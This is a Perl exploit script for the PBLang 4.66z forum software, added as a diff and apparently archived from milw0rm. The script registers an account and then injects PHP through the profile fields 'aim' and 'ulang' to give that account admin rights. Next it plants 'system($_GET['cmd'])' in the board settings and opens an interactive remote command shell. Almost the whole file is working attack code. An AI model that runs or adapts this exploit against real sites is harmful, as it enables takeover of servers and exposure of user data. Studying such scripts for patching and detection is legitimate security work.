@@ -1,0 +1,153 @@
+#!/usr/bin/perl
+# PBlang 4.66z Remote Command Execution Exploit
+# this Exploit *register* a user with admin access
+# - magic_quotes_gpc = Off
+# - Only work on 4.66z
+#### Coded & Discovered By Hessam-x / Hessamx-at-Hessamx.net
+
+use IO::Socket;
+use LWP::UserAgent;
+use HTTP::Cookies;
+
+
+ $host = $ARGV[0];
+ $uname = $ARGV[1];
+ $passwd = $ARGV[2];
+ $url = "http://".$host;
+
+ print q(
+ ###########################################################
+ #      PBLANG 4.66z Remote Command Execution Exploit      #
+ #                    www.Hessamx.Net                      #
+ ################# (C)oded By Hessam-x #####################
+
+);
+
+
+
+ if (@ARGV < 3) {
+ print " #  usage : xpl.pl [host&path] [uname] [pass]\n";
+ print " #  e.g : xpl.pl www.milw0rm.com/pblang/ str0ke 123456\n";
+ exit();
+ }
+
+   print " [~] User/Password : $uname/$passwd \n";
+   print " [~] Host : $host \n";
+
+ $evilcode  = " \$userlocation=\"hell\"; \$userjoined=\"1174733561\"; \$userhomepage=\"http://\";";
+ $evilcode .= " \$useradmin=\"1\"; \$usermod=\"0\"; \$userban=\"0\"; \$userlastvisit=\"1174733561\";";
+ $evilcode .= " \$userlastpost=\"1174733561\"; \$userprevvisit=\"1174733561\"; \$useranimsmilies=\"\"; \$lastaliaschange=\"1174733549\"; /*";
+
+ $xpl = LWP::UserAgent->new() or die;
+ $cookie_jar = HTTP::Cookies->new();
+
+ $xpl->cookie_jar( $cookie_jar );
+
+   #register
+ $reg = $xpl->post($url.'register.php?reg=2',
+ Content => [
+ "user" => $uname,
+ "pass" => $passwd,
+ "pass2" => $passwd,
+ "em" => 'evil@hell.com',
+ "realname" => 'evilcode',
+ "alias" => $uname,
+ "msn" => 'evilcode',
+ "icq" => 'evilcode',
+ "aim" => 'evilcode',
+ "yahoo" => 'evilcode',
+ "qq" => 'evilcode',
+ "web" => 'http://',
+ "loc" => 'hell',
+ "pt" => 'PBLang',
+ "av" => 'none',
+ "webav" =>'',
+ "sig" => 'be Safe',
+ "regcode" => '9999999999',
+ "lang" => 'en',
+ "accept" => '1',
+ "Submit" => 'Submit',
+ ],);
+   print " [~] registered ... \n";
+
+$login = $xpl->post($url.'login.php?id=2',
+Content => [
+'user' => $uname,
+'pass' => $passwd,
+'Submit' => 'submit',
+],);
+$setcookie = $xpl->post($url.'setcookie.php?u='.$uname);
+ if($cookie_jar->as_string =~ /$uname/) {
+   print " [~] Logined ... \n";
+ } else {
+ print " [-] Can not Login In $host !\n";
+ exit();
+ }
+ $ecode = $xpl->post($url.'ucp.php?id=2&user='.$uname,
+ Content => [
+ "npass" => $passwd,
+ "npass2" => $passwd,
+ "oldpass" => $passwd,
+ "emhide" => 'hide',
+ "user" => $uname,
+ "em" => 'evil@hell.com',
+ "realname" => 'evilcode',
+ "alias" => $uname,
+ "msn" => 'evilcode',
+ "icq" => 'evilcode',
+ "aim" => 'evilcode\";'.$evilcode,
+ "yah" => 'evilcode',
+ "qq" => 'evilcode',
+ "web" => 'http://',
+ "loc" => 'hell',
+ "pt" => 'PBLang',
+ "av" => 'none',
+ "webav" =>'',
+ "sig" => '',
+ "regcode" => '1174733482',
+ "ulang" => '*/ \$userlang=\"en\"; //',
+ "accept" => '1',
+ "Submit2" => 'Submit',
+ ],);
+print " [+] change access to admin \n";
+$syscode = "system(\$_GET[\'cmd\']); echo _END_ ; //";
+$cmd  = 'echo 1 ; echo _START_ ; '.$syscode;
+ $codesys = $xpl->post($url.'admin2.php?do=fsettings2',
+ Content => [
+"title" => 'Welcome',
+"charsets" => 'Ciso-8859-15',
+"motto" => 's', "bbgimage" => '2"; '.$cmd, "boardwidth" => '100', "boardalign" => 'center',
+"frameset" => '_self', "maxposts" => '10', "maxppp" => '25', "maxrpp" => '10', "maxlatest" => '10',
+"textareawidth" => '60', "allowem" => '1', "notifyadm" => '1', "notifyadmrepl" => '1',
+"language" => 'en', "timezone" => '0', "mr" => 'Sorry', "banreason" => 'Access+is+denied',
+"defslogan" => 'PBLang++is+super', "adminemail" => 'evil@hell.foo',
+"emsupp" => '1', "smtpmail" => '0', "welcmess" => '', "allalias" => '1',"chalias" => '21',
+"av" => '1',"webav" => '1', "avmaxwidth" => '100', "avmaxheight" => '60', "noatch" => '1',
+"attachtypes" => 'txt', "maxatchsize" => '20000',
+"minspace" => '10000000', "bbcode" => '1', "smilys" => '1', "allowreg" => '1', "chckip" => '1' ,"Submit" => 'Submit',
+ ],);
+
+   while ()
+{
+     print "\n[Shell]\$ ";
+     chomp($exc=<STDIN>);
+    &sys($exc);
+}
+sub sys($exc) {
+     if ($exc eq 'exit') { exit() ; }
+ $res = $xpl->get($url.'index.php?cmd='.$exc);
+ @result = split(/\n/,$res->content);
+ $runned = 0;
+ $on = 0;
+ for $res(@result) {
+   if ($res =~ /^_END_/) { print "\n"; return 0; }
+   if ($on == 0) { print "  $res\n"; }
+   if ($res =~ /^_START_/) { $on = 1; $runned = 1; }
+ }
+   if (!$runned) { print "\n Can not execute command . EXPLOIT FAILED !\n" ; exit(); };
+
+ }
+
+print "\n #################################################### \n";
+
+# milw0rm.com [2007-03-25]
